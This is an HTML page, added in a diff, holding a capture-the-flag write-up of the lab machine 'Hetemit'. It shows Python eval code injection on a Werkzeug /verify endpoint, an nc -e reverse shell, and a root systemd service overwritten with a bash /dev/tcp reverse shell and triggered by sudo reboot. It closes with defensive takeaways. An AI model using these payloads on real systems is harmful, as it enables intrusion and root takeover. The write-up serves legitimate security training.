@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hetemit &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Hetemit</h1>
+    <div class="meta">Target: <code>192.168.206.117</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Python</span><span class="tag">RCE</span><span class="tag">Werkzeug</span><span class="tag">SystemdService</span><span class="tag">sudo</span><span class="tag">ServiceHijack</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#python-code-evaluation-via-the-verify-endpoint">Python Code Evaluation via the /verify Endpoint</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#writable-systemd-service-sudo-reboot">Writable systemd Service + sudo Reboot</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Hetemit is a Linux box with a small but dangerous attack surface: a Python Werkzeug API on port 50000 that evaluates user-supplied code without any sanitisation. That gets a shell as a low-privilege user, but <code>sudo</code> rights let the box be rebooted, and a world-writable systemd service file that runs as root closes the chain. The privilege escalation abuses the intersection of file-write access and reboot capability to replace a service with a reverse shell, then trigger it cleanly.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
+80/tcp    open  http        Apache httpd 2.4.37 ((centos))
+139/tcp   open  netbios-ssn Samba smbd 4.6.2
+445/tcp   open  netbios-ssn Samba smbd 4.6.2
+50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
+</code></pre>
+<p>The interesting port is 50000. Werkzeug is a Python WSGI toolkit, meaning whatever application is running here is Python-backed. Port 80 served only the default CentOS Apache test page; FTP allowed anonymous login but timed out on directory listing.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="python-code-evaluation-via-the-verify-endpoint">Python Code Evaluation via the /verify Endpoint</h3>
+<p>Browsing to port 50000 returned a minimal JSON response listing the available routes:</p>
+<pre><code>{'/generate', '/verify'}
+</code></pre>
+<p>The <code>/verify</code> endpoint accepted a <code>code</code> parameter. Fuzzing it immediately revealed direct Python expression evaluation:</p>
+<pre><code class="language-sh">curl -X POST --data &quot;code=2*2&quot; http://192.168.206.117:50000/verify
+4
+</code></pre>
+<blockquote>
+<p><strong>Why this is instant RCE:</strong> the server is passing the <code>code</code> parameter straight to Python's <code>eval()</code> or equivalent. Any Python expression works, including importing the <code>os</code> module and calling <code>os.system()</code>. There's no sandbox, no allowlist, no input encoding. Expression evaluators exposed to user input are functionally equivalent to a remote shell.</p>
+</blockquote>
+<p>With <code>os</code> already in scope, I sent a reverse shell directly:</p>
+<pre><code class="language-sh">curl -X POST --data &quot;code=os.system('nc -e /bin/bash 192.168.45.167 18000')&quot; http://192.168.206.117:50000/verify
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 18000
+listening on [any] 18000 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.117] 45036
+whoami
+cmeeks
+</code></pre>
+<p>Shell upgraded to TTY:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="writable-systemd-service-sudo-reboot">Writable systemd Service + sudo Reboot</h3>
+<p><code>sudo -l</code> revealed an unusual set of permissions:</p>
+<pre><code class="language-sh">(root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
+</code></pre>
+<p>No shells, no editors, only power management commands. On its own this looks useless. LinPEAS provided the missing piece: the user <code>cmeeks</code> had write access to a systemd service file:</p>
+<pre><code>/etc/systemd/system/pythonapp.service
+</code></pre>
+<blockquote>
+<p><strong>Why a writable service + reboot = root:</strong> systemd services run with the user specified in their <code>[Service]</code> block. This service ran as <code>root</code>. If the <code>ExecStart</code> line can be modified, and the system can be rebooted, the modified service runs as root on the next boot. The <code>sudo reboot</code> permission is the trigger.</p>
+</blockquote>
+<p>I crafted a replacement service file on Kali, pointing <code>ExecStart</code> at a bash reverse shell:</p>
+<pre><code>[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.45.167/50000 0&gt;&amp;1'
+TimeoutSec=30
+RestartSec=15s
+User=root
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+<p>Transferred it to the target and overwrote the service file:</p>
+<pre><code class="language-sh">echo &quot;$(cat /tmp/pythonapp.service)&quot; &gt; pythonapp.service
+</code></pre>
+<p>Then triggered the reboot:</p>
+<pre><code class="language-sh">sudo /sbin/reboot
+</code></pre>
+<h2 id="root">Root</h2>
+<p>After the machine came back up, the modified service executed as root and connected back:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 50000
+listening on [any] 50000 ...
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.117] 50930
+bash: cannot set terminal process group (1224): Inappropriate ioctl for device
+bash: no job control in this shell
+[root@hetemit restjson_hetemit]# whoami
+root
+</code></pre>
+<pre><code class="language-sh">[root@hetemit ~]# cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Unauthenticated Python <code>eval()</code> endpoints are immediate RCE.</strong> The math expression test (<code>2*2</code>) is the fastest way to confirm evaluation before investing in shell payloads.</li>
+<li><strong><code>sudo</code> rights to reboot are not harmless.</strong> Paired with writable systemd service files, they become a root trigger. Audit both independently and together.</li>
+<li><strong>LinPEAS world-writable file checks pay off.</strong> The writable service path wasn't obvious from manual enumeration; the automated scan surfaced it immediately.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
